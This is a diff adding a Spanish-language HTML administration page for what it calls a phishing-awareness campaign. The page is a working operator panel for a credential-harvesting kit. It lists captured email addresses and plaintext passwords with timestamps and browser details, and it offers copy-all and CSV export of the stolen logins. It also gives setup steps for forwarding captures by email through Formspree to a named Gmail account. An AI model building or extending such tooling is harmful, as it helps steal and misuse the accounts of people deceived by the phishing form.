@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Administración - Capturas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 30px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+        }
+        
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+        
+        .btn-success {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #229954;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        th {
+            background: #f8f9fa;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 2px solid #dee2e6;
+        }
+        
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .password {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .password.hidden {
+            filter: blur(5px);
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+        
+        .empty-state svg {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 20px;
+            opacity: 0.3;
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+        
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-left: 4px solid #17a2b8;
+        }
+        
+        .alert-warning {
+            background: #fff3cd;
+            color: #856404;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .badge-new {
+            background: #28a745;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            🛡️ Panel de Administración
+        </h1>
+        <p class="subtitle">Campaña de Concientización sobre Phishing - Datos Capturados</p>
+        
+        <div class="alert alert-warning" id="emailWarning">
+            ⚠️ <strong>Importante:</strong> Los datos se guardan localmente en tu navegador. Para recibir emails automáticos, necesitas configurar Formspree o EmailJS. 
+            <a href="#setup" onclick="showSetupInstructions()">Ver instrucciones</a>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalCapturas">0</div>
+                <div class="stat-label">Total Capturas</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="capturasHoy">0</div>
+                <div class="stat-label">Capturas Hoy</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="ultimaCaptura">--</div>
+                <div class="stat-label">Última Captura</div>
+            </div>
+        </div>
+        
+        <div class="actions">
+            <button class="btn-primary" onclick="recargarDatos()">🔄 Actualizar</button>
+            <button class="btn-success" onclick="exportarCSV()">📥 Exportar CSV</button>
+            <button class="btn-success" onclick="copiarTodo()">📋 Copiar Todo</button>
+            <button class="btn-danger" onclick="limpiarDatos()">🗑️ Limpiar Todo</button>
+        </div>
+        
+        <div class="table-container">
+            <table id="capturasTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Tipo</th>
+                        <th>Fecha y Hora</th>
+                        <th>Email Capturado</th>
+                        <th>Contraseña</th>
+                        <th>Navegador</th>
+                        <th>Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="capturasBody">
+                    <!-- Se llenará dinámicamente -->
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="empty-state" id="emptyState" style="display: none;">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+            </svg>
+            <h3>No hay capturas aún</h3>
+            <p>Las capturas de credenciales aparecerán aquí cuando alguien use el formulario.</p>
+        </div>
+    </div>
+
+    <script>
+        let capturas = [];
+        let passwordsVisible = {};
+
+        function cargarDatos() {
+            try {
+                capturas = JSON.parse(localStorage.getItem('capturas') || '[]');
+                mostrarDatos();
+                actualizarEstadisticas();
+            } catch(e) {
+                console.error('Error cargando datos:', e);
+                capturas = [];
+            }
+        }
+
+        function mostrarDatos() {
+            const tbody = document.getElementById('capturasBody');
+            const emptyState = document.getElementById('emptyState');
+            const table = document.getElementById('capturasTable');
+            
+            if (capturas.length === 0) {
+                emptyState.style.display = 'block';
+                table.style.display = 'none';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            table.style.display = 'table';
+            
+            tbody.innerHTML = capturas.map((captura, index) => {
+                const tipo = captura.type || 'login';
+                const tipoBadge = tipo === 'reset' ? '<span style="background:#ff9800;color:#fff;padding:2px 6px;border-radius:3px;font-size:11px;">Reset</span>' : '<span style="background:#2196f3;color:#fff;padding:2px 6px;border-radius:3px;font-size:11px;">Login</span>';
+                return `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${tipoBadge}</td>
+                    <td>${captura.timestamp}</td>
+                    <td><strong>${captura.email}</strong></td>
+                    <td>
+                        <span class="password ${passwordsVisible[index] ? '' : 'hidden'}" 
+                              onclick="togglePassword(${index})">
+                            ${captura.password}
+                        </span>
+                    </td>
+                    <td style="font-size: 11px; max-width: 200px; overflow: hidden; text-overflow: ellipsis;">
+                        ${captura.userAgent ? captura.userAgent.substring(0, 50) + '...' : 'N/A'}
+                    </td>
+                    <td>
+                        <button class="btn-primary" style="padding: 5px 10px; font-size: 12px;" 
+                                onclick="copiarCaptura(${index})">
+                            📋 Copiar
+                        </button>
+                    </td>
+                </tr>
+                `;
+            }).join('');
+        }
+
+        function actualizarEstadisticas() {
+            document.getElementById('totalCapturas').textContent = capturas.length;
+            
+            const hoy = new Date().toLocaleDateString('es-ES');
+            const capturasHoy = capturas.filter(c => c.timestamp.includes(hoy)).length;
+            document.getElementById('capturasHoy').textContent = capturasHoy;
+            
+            if (capturas.length > 0) {
+                const ultima = capturas[capturas.length - 1].timestamp;
+                document.getElementById('ultimaCaptura').textContent = ultima.split(',')[1] || ultima;
+            }
+        }
+
+        function togglePassword(index) {
+            passwordsVisible[index] = !passwordsVisible[index];
+            mostrarDatos();
+        }
+
+        function recargarDatos() {
+            cargarDatos();
+            alert('✅ Datos actualizados');
+        }
+
+        function limpiarDatos() {
+            if (confirm('⚠️ ¿Estás seguro de eliminar TODAS las capturas? Esta acción no se puede deshacer.')) {
+                localStorage.removeItem('capturas');
+                capturas = [];
+                mostrarDatos();
+                actualizarEstadisticas();
+                alert('✅ Todos los datos han sido eliminados');
+            }
+        }
+
+        function copiarCaptura(index) {
+            const captura = capturas[index];
+            const texto = `
+Email: ${captura.email}
+Contraseña: ${captura.password}
+Fecha: ${captura.timestamp}
+Navegador: ${captura.userAgent}
+            `.trim();
+            
+            navigator.clipboard.writeText(texto).then(() => {
+                alert('✅ Datos copiados al portapapeles');
+            });
+        }
+
+        function copiarTodo() {
+            if (capturas.length === 0) {
+                alert('No hay datos para copiar');
+                return;
+            }
+            
+            const texto = capturas.map((c, i) => `
+═══════════════════════════════════════════
+CAPTURA #${i + 1}
+═══════════════════════════════════════════
+📧 Email: ${c.email}
+🔑 Contraseña: ${c.password}
+⏰ Fecha: ${c.timestamp}
+🌐 Navegador: ${c.userAgent}
+            `).join('\n');
+            
+            navigator.clipboard.writeText(texto).then(() => {
+                alert(`✅ ${capturas.length} capturas copiadas al portapapeles`);
+            });
+        }
+
+        function exportarCSV() {
+            if (capturas.length === 0) {
+                alert('No hay datos para exportar');
+                return;
+            }
+            
+            const csv = [
+                ['Fecha', 'Email', 'Contraseña', 'Navegador', 'URL'],
+                ...capturas.map(c => [
+                    c.timestamp,
+                    c.email,
+                    c.password,
+                    c.userAgent,
+                    c.url
+                ])
+            ].map(row => row.join(',')).join('\n');
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `capturas_${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+            
+            alert(`✅ Archivo CSV descargado con ${capturas.length} capturas`);
+        }
+
+        function showSetupInstructions() {
+            alert(`
+📧 CONFIGURACIÓN DE EMAIL AUTOMÁTICO
+
+Para recibir emails automáticamente, necesitas configurar Formspree:
+
+1. Ve a: https://formspree.io
+2. Regístrate con: sofly7899@gmail.com
+3. Crea un nuevo formulario
+4. Copia el Form ID (ejemplo: xanyevdp)
+5. Actualiza el código en script.js línea 100
+
+Alternativamente, puedes usar este panel para revisar las capturas manualmente.
+            `);
+        }
+
+        // Cargar datos al iniciar
+        cargarDatos();
+        
+        // Actualizar cada 5 segundos
+        setInterval(cargarDatos, 5000);
+    </script>
+</body>
+</html>
